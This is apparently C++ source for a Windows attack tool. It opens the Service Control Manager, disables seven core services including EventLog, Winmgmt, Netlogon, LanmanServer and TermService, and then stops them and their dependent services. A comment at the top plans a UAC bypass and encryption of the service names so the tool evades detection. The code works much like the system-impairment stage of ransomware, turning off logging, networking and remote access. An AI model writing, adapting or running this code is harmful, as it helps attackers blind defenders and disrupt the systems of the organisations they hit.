#include <iostream>
#include <Windows.h>
#include <vector>
#include <string>
using namespace std;

/*

*** To check if need to implement UAC bypass and encrypt service names


*/

BOOL StopServiceAndDependencies(SC_HANDLE hSCM, SC_HANDLE schService)
{
	SC_HANDLE hDepService;
	LPENUM_SERVICE_STATUS   lpDependencies = NULL;
	SERVICE_STATUS_PROCESS ssp;
	DWORD dwBytesNeeded;
	DWORD dwCount = 0;

	if (!ChangeServiceConfigA(
		schService,        // handle of service 
		SERVICE_NO_CHANGE, // service type: no change 
		SERVICE_DISABLED,  // service start type 
		SERVICE_NO_CHANGE, // error control: no change 
		NULL,              // binary path: no change 
		NULL,              // load order group: no change 
		NULL,              // tag ID: no change 
		NULL,              // dependencies: no change 
		NULL,              // account name: no change 
		NULL,              // password: no change 
		NULL))            // display name: no change
	{
		printf("ChangeServiceConfig failed (%d)\n", GetLastError());
		return false;
	}
	if (EnumDependentServicesA(schService, SERVICE_ACTIVE, lpDependencies, 0, &dwBytesNeeded,
		&dwCount))
	{
		printf("There are no dependencies");
	}
	else {
		if (GetLastError() != ERROR_MORE_DATA)
			return GetLastError(); // Unexpected error
		 // Allocate a buffer for the dependencies

		lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(GetProcessHeap(),
			HEAP_ZERO_MEMORY, dwBytesNeeded);
		if (!lpDependencies) {
			printf("Buffer allocation for dependencies failed! error: %d\n", GetLastError());
			return false;
		}
		__try {

			// Enumerate the dependencies
			if (!EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies,
				dwBytesNeeded, &dwBytesNeeded, &dwCount)) {
				printf("Dependencies enum failed error: %d\n", GetLastError());
				return false;
			}
			for (int i = 0; i < dwCount; i++) {
				hDepService = OpenService(hSCM, lpDependencies[i].lpServiceName,
					SERVICE_STOP | SERVICE_QUERY_STATUS);
				if (!hDepService) {
					printf("OpenService failed (%d)\n", GetLastError());
					return false;
				}
				__try {
					// Send a stop code
					if (!ControlService(hDepService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp)) {
						printf("Stopping service  failed (%d)\n", GetLastError());
						return false;
					}
					while (ssp.dwCurrentState != SERVICE_STOPPED)
					{
						Sleep(ssp.dwWaitHint);
						if (!QueryServiceStatus(hDepService, (LPSERVICE_STATUS)&ssp))

							printf("Stopping service  failed (%d)\n", GetLastError());
						if (ssp.dwCurrentState == SERVICE_STOPPED)
							break;
					}
				}
				__finally
				{
					CloseServiceHandle(hDepService);
				}
			}

		}
		__finally
		{
			// Always free the enumeration buffer
			HeapFree(GetProcessHeap(), 0, lpDependencies);

		}
		if (!ControlService(
			schService,
			SERVICE_CONTROL_STOP,
			(LPSERVICE_STATUS)&ssp))
		{
			printf("Stopping service  failed (%d)\n", GetLastError());
		}
		return true;
	}
}
int main()
{
	// List of critical services
	vector<string> processes = { "NlaSvc","LanmanWorkstation","LanmanServer","Winmgmt",
		"EventLog", "TermService","Netlogon" };
	
	// Open SCManager
	SC_HANDLE scMgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE schService;

	if (scMgr)
	{
		DWORD additionalNeeded;
		DWORD cnt = 0;
		DWORD resume = 0;
		ENUM_SERVICE_STATUS_PROCESS services[1024];

		//Enum services
		if (
			EnumServicesStatusExA(scMgr,
				SC_ENUM_PROCESS_INFO,
				SERVICE_WIN32_OWN_PROCESS,
				SERVICE_ACTIVE,
				(LPBYTE)services,
				sizeof(services),
				&additionalNeeded,
				&cnt,
				&resume,
				NULL
			)) {

			// Itterate through services
			for (DWORD i = 0; i < cnt; i++) {

				// Check if service is in wanted services list
				if (std::find(processes.begin(), processes.end(),
					services[i].lpServiceName) != processes.end())
				{
					schService = OpenServiceA(
						scMgr,            // SCM database 
						services[i].lpServiceName,               // name of service 
						SERVICE_ALL_ACCESS);  // need change config access
					if (schService == NULL)
					{
						printf("OpenService failed (%d)\n", GetLastError());
						CloseServiceHandle(scMgr);
						return 1;
					}// Change the service start type.
					printf("Service: %s\n", services[i].lpServiceName);
					
					// Stop service and its dependencies
					StopServiceAndDependencies(scMgr, schService);

				}
			}
		}
	}
	else {
		cout << "error: " << GetLastError() << endl;
	}
	return 0;
}